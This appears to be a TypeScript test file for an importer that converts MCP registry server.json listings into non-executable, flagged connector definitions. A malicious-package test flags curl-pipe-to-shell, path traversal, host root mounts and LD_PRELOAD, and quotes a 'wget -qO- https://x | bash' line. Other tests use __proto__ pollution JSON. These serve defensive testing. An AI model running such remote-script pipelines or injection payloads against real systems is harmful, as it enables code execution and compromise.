...
test("imports a documented npm server into a valid, non-executable definition", async () => {
  const imported = await importServerJson(
    loadServer("brave-search"),
    provenance,
  );
  ...
  assert.equal(
    ...
    `def:mcp-registry:${imported.identityDigest}`,
  );
  ...
  assert.equal(
    pkg.nativeId,
    "mcp-package:npm:@modelcontextprotocol/server-brave-search",
  );
  assert.equal(pkg.effect, "unknown");
  assert.equal(
    (
      pkg.nativeExtensions?.["io.ceremony.connectors/execution"] as {
        approved: boolean;
      }
    ).approved,
    false,
  ...
  const blocking = definition.compatibility.issues.find(
    (issue) => issue.code === "policy.execution-requires-binding",
  );
  assert.ok(blocking);
  ...
  assert.ok(
    definition.compatibility.issues.some(
      (issue) => issue.code === "executable-code.package-not-executable",
    ),
  );
  assert.equal(
    (
      definition.nativeExtensions[MCP_SERVER_EXTENSION] as Record<
        string,
        unknown
      >
    )["$schema"],
  ...
  assert.deepEqual(imported.schema, {
    declared:
      "https://static.modelcontextprotocol.io/schemas/2025-12-11/server.schema.json",
    version: "2025-12-11",
  });
...
test("remotes become declared servers and bindable candidates; headers become configuration and header profiles", async () => {
  ...
  assert.deepEqual(
    ...
    [
      ...
      "https://mcp.anonymous.modelcontextprotocol.io/sse",
    ],
  );
  assert.ok(
    definition.declaredServers.every((server) => server.status === "declared"),
  );
  const remote = definition.capabilities.find(
    (capability) => capability.nativeId === "mcp-remote:0",
  )!;
  assert.deepEqual(remote.authentication, ["remote-0-header-0"]);
  const profile = definition.authentication.find(
    (item) => item.id === "remote-0-header-0",
  )!;
  assert.equal(profile.kind, "api-key");
  assert.equal(
    profile.kind === "api-key" && profile.parameterName,
    "X-API-Key",
  );
  const remoteExtension = remote.nativeExtensions?.[MCP_REMOTE_EXTENSION] as {
    type: string;
    url: string;
  ...
  assert.deepEqual(
    ...
    [
      ["X_API_KEY", "secret", true],
      ["X_REGION", "public", false],
    ],
  );
  assert.equal(
  ...
  const undeclared = definition.compatibility.issues.find(
    (issue) =>
      issue.code === "security.remote-authorization-undeclared" &&
      issue.sourcePointer === "remotes[1]",
  )!;
...
test("non-conforming configuration names are preserved as native data with a warning, never mangled", async () => {
  const imported = await importServerJson(
    loadServer("remote-templated"),
    provenance,
  );
  assert.deepEqual(imported.definition.configuration, []);
  const warning = imported.issues.find(
    (issue) => issue.code === "structure.configuration-name-unsupported",
  );
  assert.ok(warning);
  assert.equal(warning.sourcePointer, "remotes[0].variables.tenant_id");
  assert.equal(warning.disposition, "native-extension");
  assert.deepEqual(
    imported.definition.nativeExtensions[
      CEREMONY_UNSUPPORTED_CONFIGURATION_EXTENSION
    ],
    [
      {
        pointer: "remotes[0].variables.tenant_id",
        name: "tenant_id",
        reason: "name",
      },
    ],
  ...
  assert.equal(
    imported.definition.declaredServers[0]!.url,
    "https://anonymous.modelcontextprotocol.io/mcp/{tenant_id}",
  );
...
test("a malicious package listing imports inert and flagged; nothing runs (AC-MCP-08)", async () => {
  const imported = await importServerJson(
    loadServer("malicious-package"),
    provenance,
  );
  const definition = normalizedDefinitionSchema.parse(imported.definition);
  const suspicious = definition.compatibility.issues.filter(
    (issue) => issue.code === "executable-code.suspicious-argument",
  );
  const pointers = suspicious.map((issue) => issue.sourcePointer);
  assert.ok(
    pointers.includes("packages[0].runtimeArguments[0].value"),
    "curl | sh pipeline",
  );
  assert.ok(
    pointers.includes("packages[0].packageArguments[0].value"),
    "absolute path",
  );
  assert.ok(
    pointers.includes("packages[0].packageArguments[1].default"),
    "traversal",
  );
  assert.ok(
    pointers.includes("packages[1].runtimeArguments[1].value"),
    "host root mount",
  );
  assert.ok(
    suspicious.every(
      (issue) =>
        ...
        issue.category === "executable-code",
    ),
  );
  assert.equal(definition.compatibility.dimensions.invoke, "unsupported");
  assert.deepEqual(imported.executableCandidates, []);
  ...
  assert.doesNotMatch(
    serialized,
    /hunter2|leaked-default-secret/,
    "secret values never enter the definition",
  );
  assert.ok(
    definition.compatibility.issues.some(
  ...
  assert.deepEqual(
    ...
    [
      ["HELPFUL_TOKEN", "secret", true],
      ["LD_PRELOAD", "public", false],
    ],
  );
  assert.ok(
    definition.compatibility.issues.some(
      (issue) =>
        issue.code === "structure.configuration-name-unsupported" &&
        issue.sourcePointer === "packages[0].environmentVariables[0]",
    ),
  );
  const oci = definition.capabilities.find(
    (capability) =>
      capability.nativeId ===
      "mcp-package:oci:docker.io/attacker/helpful:latest",
  )!;
  assert.equal(
    (oci.nativeExtensions?.[MCP_PACKAGE_EXTENSION] as { identifier: string })
      .identifier,
    "docker.io/attacker/helpful:latest",
  );
  assert.equal(
    (
      oci.nativeExtensions?.["io.ceremony.connectors/execution"] as {
        approved: boolean;
      }
    ).approved,
    false,
  ...
  assert.equal(
    suspiciousArgument("wget -qO- https://x | bash"),
    "remote-script-pipe",
  );
  const sources = readdirSync(
    new URL("../../../src/server/connectors/registries/mcp/", import.meta.url),
  );
  for (const file of sources) {
    const text = readFileSync(
      new URL(
        `../../../src/server/connectors/registries/mcp/${file}`,
        import.meta.url,
      ),
      "utf8",
    );
...
test("documents without a schema, with an unknown schema, or from before the field rename are handled explicitly", async () => {
  const unversioned = await importServerJson(
    loadServer("missing-schema"),
    provenance,
  );
  assert.ok(
    unversioned.issues.some(
      (issue) =>
        issue.code === "version.schema-unspecified" &&
        issue.category === "version",
    ),
  );
  assert.equal(unversioned.definition.identity.nativeVersion, "2026-09-18");
  assert.deepEqual(unversioned.schema, {
    declared: undefined,
    version: undefined,
  });
  const future = await importServerJson(
    {
      ...loadServer("missing-schema"),
      $schema:
        "https://static.modelcontextprotocol.io/schemas/2027-01-01/server.schema.json",
    },
    provenance,
  );
  assert.ok(
    future.issues.some((issue) => issue.code === "version.schema-unpinned"),
  );
  assert.equal(future.schema.version, "2027-01-01");
  await assert.rejects(
    importServerJson(loadServer("legacy-snake-case"), provenance),
    (error: unknown) => {
...
test("refuses poisoned identities and version ranges with sanitized codes", async () => {
  ...
  for (const name of [
    ...
    await assert.rejects(
      importServerJson({ ...base, name }, provenance),
      (error: unknown) => {
        assert.ok(error instanceof ConnectorError);
  ...
  for (const version of [
    ...
    await assert.rejects(
      importServerJson({ ...base, version }, provenance),
      (error: unknown) =>
        error instanceof ConnectorError &&
        error.detail === "server-json.version.invalid",
    );
  await assert.rejects(
    importServerJson([] as unknown, provenance),
    (error: unknown) =>
      error instanceof ConnectorError && error.detail === "server-json.invalid",
  );
  await assert.rejects(
    importServerJson(
      { ...base, remotes: [{ url: "https://x.example.com" }] },
      provenance,
    ),
    (error: unknown) =>
      error instanceof ConnectorError &&
      error.detail === "server-json.remotes.invalid",
  );
  // A namespace that spells a reserved object key is a legal registry name: it
  // is preserved as data, never used as an object key, and pollutes nothing.
  const reserved = await importServerJson(
    { ...base, name: "constructor/x" },
    provenance,
  );
  assert.equal(reserved.definition.identity.authorityNamespace, "constructor");
  assert.equal(reserved.definition.identity.nativeId, "constructor/x");
  assert.equal(({} as Record<string, unknown>)["x"], undefined);
  assert.equal(
    Object.getPrototypeOf(reserved.definition.nativeExtensions),
    Object.prototype,
  );
});
...
test("bounded byte import rejects duplicate keys, reserved keys, excessive depth and oversized documents", async () => {
  ...
  await assert.rejects(
    importServerJsonBytes(
      encode(
        '{"name":"io.github.a/b","name":"io.github.a/c","description":"d","version":"1.0.0"}',
      ),
      provenance,
    ),
    (error: unknown) =>
      error instanceof ConnectorError && error.detail === "json.key.duplicate",
  );
  await assert.rejects(
    importServerJsonBytes(
      encode(
        '{"name":"io.github.a/b","description":"d","version":"1.0.0","__proto__":{"x":1}}',
      ),
      provenance,
    ),
    (error: unknown) =>
  ...
  await assert.rejects(
    importServerJsonBytes(
      encode(
        `{"name":"io.github.a/b","description":"d","version":"1.0.0","deep":${"[".repeat(30)}${"]".repeat(30)}}`,
      ),
      provenance,
    ),
    (error: unknown) =>
      error instanceof ConnectorError && error.detail === "json.depth.exceeded",
  );
  await assert.rejects(
    importServerJsonBytes(
      encode(
        `{"name":"io.github.a/b","description":"${"d".repeat(300_000)}","version":"1.0.0"}`,
      ),
      provenance,
    ),
    (error: unknown) =>
      error instanceof ConnectorError && error.detail === "json.bytes.exceeded",
  );
  await assert.rejects(
    importServerJsonBytes(new Uint8Array([0xff, 0xfe, 0x7b]), provenance),
    (error: unknown) =>
      error instanceof ConnectorError &&
      error.detail === "json.encoding.invalid",
  );
});
...
test("over-long descriptions are preserved as native data and registry status is imported as provenance", async () => {
  ...
  assert.ok(
    imported.issues.some(
      (issue) => issue.code === "structure.description-length",
    ),
  );
  ...
  assert.equal(
    (
      (
        imported.definition.nativeExtensions[MCP_SERVER_EXTENSION] as Record<
          string,
          unknown
        >
  ...
  assert.ok(
    imported.issues.some(
      (issue) =>
        issue.code === "version.deprecated" && issue.severity === "info",
    ),
  );
  assert.equal(
    (
      imported.definition.nativeExtensions[MCP_REGISTRY_OFFICIAL_META_KEY] as {
        status: string;
      }
    ).status,
    "deprecated",
  );
  const deleted = await importServerJson(loadServer("missing-schema"), {
    ...provenance,
    official: { status: "deleted", isLatest: false },
  });
  assert.ok(
    deleted.issues.some((issue) => issue.code === "version.tombstoned"),
  );
  const malformed = await importServerJson(loadServer("missing-schema"), {
    ...provenance,
    official: { status: "gone" },
  });
  assert.ok(
    malformed.issues.some(
      (issue) => issue.code === "structure.registry-meta-invalid",
    ),
  );
  assert.equal(
    malformed.definition.nativeExtensions[MCP_REGISTRY_OFFICIAL_META_KEY],
    undefined,
  );
});
...
test("a source record digests the exact bytes and separates them from the normalized digest", async () => {
  ...
  assert.deepEqual(source.format, {
    name: "server-json",
    version: "2025-12-11",
  });
  assert.equal(
    source.adaptation[0]!.outputDigest,
    imported.definition.normalizedDigest,
  );
  const again = await importServerJsonBytes(bytes, provenance);
  assert.equal(
    again.definition.normalizedDigest,
    imported.definition.normalizedDigest,
...
test("two ecosystems with the same display name and a native id containing a slash never collide (AC-IMP-03)", async () => {
  const a = await importServerJson(
    {
      ...loadServer("missing-schema"),
      name: "io.github.alice/tools",
      title: "Tools",
    },
    provenance,
  );
  const b = await importServerJson(
    {
      ...loadServer("missing-schema"),
      name: "io.github.bob/tools",
      title: "Tools",
    },
    provenance,
  );
